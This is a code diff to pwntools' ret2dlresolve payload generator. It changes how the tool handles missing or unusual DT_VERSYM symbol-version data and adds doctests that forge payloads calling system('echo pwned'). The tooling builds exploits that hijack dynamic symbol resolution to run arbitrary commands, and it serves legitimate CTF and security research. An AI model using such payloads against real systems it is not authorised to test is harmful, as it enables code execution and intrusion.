@@ -63,6 +63,68 @@ You can also use ``Ret2dlresolve`` on AMD64:
     ... else:
     ...     p.recvline() == b'pwned\n'
     True
+
+Payload generation is robust to missing, out-of-range, or non-zero symbol
+version (``DT_VERSYM``) metadata. A normal ELF32 target has a version table and
+the relocation structures are built as usual:
+
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
+    >>> isinstance(dlresolve.versym, int) and dlresolve.reloc_index >= 0
+    True
+    >>> len(dlresolve.payload) > 0
+    True
+
+An ELF without symbol versioning has no ``DT_VERSYM`` tag (``dynamic_value_by_tag``
+returns ``None``). This used to raise ``TypeError``; now ``versym`` stays ``None``
+and the payload is still generated, since the dynamic linker does not consult a
+version table that does not exist:
+
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+    >>> _orig = elf.dynamic_value_by_tag
+    >>> elf.dynamic_value_by_tag = lambda tag, _o=_orig: None if tag == 'DT_VERSYM' else _o(tag)
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
+    >>> dlresolve.versym is None
+    True
+    >>> len(dlresolve.payload) > 0
+    True
+
+A ``DT_VERSYM`` that points far outside the mapped image makes the computed
+version index address unmapped. Rather than raising or indexing out of bounds,
+the payload is flagged ``unreliable``:
+
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+    >>> _orig = elf.dynamic_value_by_tag
+    >>> elf.dynamic_value_by_tag = lambda tag, _o=_orig: 0xfffff000 if tag == 'DT_VERSYM' else _o(tag)
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
+    >>> dlresolve.unreliable
+    True
+
+When the version table exists, ``Ret2dlresolvePayload`` checks that the VERSYM
+entry for ``data_addr`` is zero (``VER_NDX_LOCAL``) -- glibc refuses to resolve
+the symbol otherwise. A manually specified address with a non-zero entry is
+marked unreliable, and when ``data_addr`` is not given a valid address is
+searched for automatically:
+
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"], data_addr=0x804a030)
+    >>> dlresolve.unreliable
+    True
+    >>> elf.write(0x8049fc8, p32(0x8048066))
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
+    >>> hex(dlresolve.data_addr)
+    '0x804ade0'
+    >>> dlresolve.unreliable
+    False
+
+The ELF64 path with a normal version table is unaffected:
+
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('amd64'))
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
+    >>> isinstance(dlresolve.versym, int)
+    True
+    >>> len(dlresolve.payload) > 0
+    True
 """
 
 from copy import deepcopy
@@ -241,7 +303,14 @@ class Ret2dlresolvePayload:
         self.strtab = elf.dynamic_value_by_tag("DT_STRTAB") + self.elf_load_address_fixup
         self.symtab = elf.dynamic_value_by_tag("DT_SYMTAB") + self.elf_load_address_fixup
         self.jmprel = elf.dynamic_value_by_tag("DT_JMPREL") + self.elf_load_address_fixup
-        self.versym = elf.dynamic_value_by_tag("DT_VERSYM") + self.elf_load_address_fixup
+        # DT_VERSYM is optional: ELFs without symbol versioning (no
+        # ``.gnu.version`` section) have no such tag and
+        # ``dynamic_value_by_tag`` returns None. Keep it as None in that case
+        # instead of crashing on ``None + fixup``; the version-index checks
+        # below are skipped when there is no version table.
+        self.versym = elf.dynamic_value_by_tag("DT_VERSYM")
+        if self.versym is not None:
+            self.versym += self.elf_load_address_fixup
         self.symbol = _need_bytes(symbol, min_wrong=0x80)
         self.args = args
         self.real_args = self._format_args()
@@ -277,8 +346,24 @@ class Ret2dlresolvePayload:
         bss = self.elf.get_section_by_name(".bss").header.sh_addr + self.elf_load_address_fixup
         bss_size = self.elf.get_section_by_name(".bss").header.sh_size
         addr = bss + bss_size
-        addr = addr + (-addr & 0xfff) - 0x200 #next page in memory - 0x200
-        return addr
+        default_addr = addr + (-addr & 0xfff) - 0x200 #next page in memory - 0x200
+
+        # When the ELF has a version table, glibc's _dl_fixup indexes
+        # versym[ELF_R_SYM(r_info)] with the forged symbol index and refuses to
+        # resolve the symbol unless that 16-bit entry is zero (VER_NDX_LOCAL).
+        # Walk candidate addresses downwards and pick the first whose VERSYM
+        # entry is mapped and zero. If there is no version table (versym is
+        # None) there is no such constraint, so keep the default address.
+        if self.versym is None:
+            return default_addr
+
+        elf_sym_size = Elf32_Sym.size if context.bits == 32 else Elf64_Sym.size
+        for cand in range(default_addr, addr - 1, -elf_sym_size):
+            index = align(elf_sym_size, cand + len(self.symbol) + 1 - self.symtab) // elf_sym_size
+            ver_addr = self.versym + 2 * index
+            if self.elf.memory[ver_addr] and self.elf.memory[ver_addr + 1] and self.elf.u16(ver_addr) == 0:
+                return cand
+        return default_addr
 
     def _build_structures(self):
         # The first part of the payload is the usual of ret2dlresolve.
@@ -327,24 +412,42 @@ class Ret2dlresolvePayload:
             rel_addr - self.data_addr: rel
         })
 
-        ver_addr = self.versym + 2 * index # Elf_HalfWord
-
         log.debug("Symtab: %#x", self.symtab)
         log.debug("Strtab: %#x", self.strtab)
-        log.debug("Versym: %#x", self.versym)
         log.debug("Jmprel: %#x", self.jmprel)
         log.debug("ElfSym addr: %#x", sym_addr)
         log.debug("ElfRel addr: %#x", rel_addr)
         log.debug("Symbol name addr: %#x", symbol_name_addr)
-        log.debug("Version index addr: %#x", ver_addr)
         log.debug("Data addr: %#x", self.data_addr)
         log.debug("Resolution addr: %#x", self.resolution_addr)
-        if not self.elf.memory[ver_addr]:
-            log.warn("Ret2dlresolve is likely impossible in this ELF "
-                     "(too big gap between text and writable sections).\n"
-                     "If you get a segmentation fault with fault_addr = %#x, "
-                     "try a different technique.", ver_addr)
-            self.unreliable = True
+
+        # Validate the symbol version index against the VERSYM table.
+        # The dynamic linker only consults the version table (DT_VERSYM) during
+        # lazy resolution when it exists. If the ELF has no version information
+        # the tag is absent (self.versym is None), so there is nothing to
+        # validate and resolution does not depend on it.
+        if self.versym is None:
+            log.debug("ELF has no DT_VERSYM; skipping version-index validation")
+        else:
+            ver_addr = self.versym + 2 * index # Elf_HalfWord
+            log.debug("Versym: %#x", self.versym)
+            log.debug("Version index addr: %#x", ver_addr)
+            # self.elf.memory is an intervaltree: indexing an address outside
+            # any mapped segment returns an empty (falsy) set rather than
+            # raising. Both bytes of the 16-bit entry must be mapped.
+            if not (self.elf.memory[ver_addr] and self.elf.memory[ver_addr + 1]):
+                log.warn("Ret2dlresolve is likely impossible in this ELF "
+                         "(too big gap between text and writable sections).\n"
+                         "If you get a segmentation fault with fault_addr = %#x, "
+                         "try a different technique.", ver_addr)
+                self.unreliable = True
+            elif self.elf.u16(ver_addr) != 0:
+                # glibc requires versym[index] == 0 (VER_NDX_LOCAL) to resolve.
+                log.warn("Ret2dlresolve is likely impossible at this address "
+                         "(non-zero version index %#x at %#x).\n"
+                         "If you get a segmentation fault, try a different data_addr or technique.",
+                         self.elf.u16(ver_addr), ver_addr)
+                self.unreliable = True
 
     def _build_args(self):
         # The second part of the payload will include strings and pointers needed for ROP.
